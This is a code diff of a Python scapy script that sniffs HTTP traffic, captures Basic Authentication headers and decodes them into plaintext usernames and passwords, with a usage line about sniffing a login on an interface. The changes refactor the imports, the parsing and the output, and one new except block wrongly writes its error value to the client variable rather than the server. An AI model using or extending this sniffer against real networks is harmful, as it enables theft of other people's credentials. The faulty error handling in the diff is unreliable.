@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
-import logging
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+from logging import getLogger, ERROR
+getLogger("scapy.runtime").setLevel(ERROR)
 from scapy.all import *
 from sys import argv, exit
 from re import compile
@@ -13,10 +13,10 @@ saved_packets = None
 open_in_wireshark = False
 default_bpf_filter = "tcp port 80"
 
-basic_auth_filter = re.compile(r"Authorization: Basic (.*)")
-host_filter = re.compile(r"Host: (.*)")
+basic_auth_filter = compile(r"Authorization: Basic (.*)")
+host_filter = compile(r"Host: (.*)")
 valid_methods = ["OPTIONS", "GET", "HEAD", "POST", "PUT", "DELETE", "TRACE", "CONNECT"]
-method_filter = re.compile("(" + '|'.join(valid_methods) + r") (.*) HTTP.*?")
+method_filter = compile("(" + '|'.join(valid_methods) + r") (.*) HTTP.*?\r\n")
 # method_filter = re.compile(r"([A-Z]*?) (.*) HTTP.*?") # matches capital letters that come before the request, unintentionally (you might see a RGET or HGET or something)
 
 def format_password(packet):
@@ -24,15 +24,25 @@ def format_password(packet):
 	if contains_basic_auth:
 		result = ''
 		result += ctime() + " | "
-		client = packet[IP].src + ':' + str(packet[TCP].sport)
+		client = ''
+		try:
+			client = str(packet[IP].src)
+			client += ':' + str(packet[TCP].sport)
+		except IndexError:
+			client = "ClientParseError"
 		result += client + " -> "
-		server = packet[IP].dst + ':' + str(packet[TCP].dport)
+		del client
+		server = ''
+		try:
+			server = packet[IP].dst
+			server += ':' + str(packet[TCP].dport)
+		except IndexError:
+			client = "ServerParseError"
 		result += server + " | "
+		del server
 		contains_method = method_filter.search(str(packet))
 		if contains_method:
 			result += contains_method.group(1).strip() + " "
-			if contains_method.group(1) != "GET":
-				print(str(packet))
 		contains_host = host_filter.search(str(packet))
 		if contains_host:
 			host = contains_host.group(1).rstrip()
@@ -40,8 +50,9 @@ def format_password(packet):
 		if contains_method:
 			requested_file_path = contains_method.group(2).strip()
 			result += requested_file_path
-		result += " "
-		creds = contains_basic_auth.group(1).rstrip()
+		del contains_host, contains_method
+		result += " | "
+		creds = contains_basic_auth.group(1).strip()
 		result += "[" + str(creds) + "] "
 		plain = ''
 		try:
@@ -89,7 +100,7 @@ def print_usage():
 	print("\t\t\t Sniff for one login on interface eth1, for up to ten minutes, whichever comes first")
 
 def print_header():
-	print("Time | Cl.ie.nt.IP:Port -> Se.rv.er.IP:Port | METHOD http://host/path/file | [encodedcredentials] [decodedusername:andpassword]")
+	print("Time and Date | Cl.ie.nt.IP:Port -> Se.rv.er.IP:Port | METHOD http://host/path/file | [encodedcredentials] [decodedusername:andpassword]")
 
 if "-h" in argv or "--help" in argv:
 	print_usage()
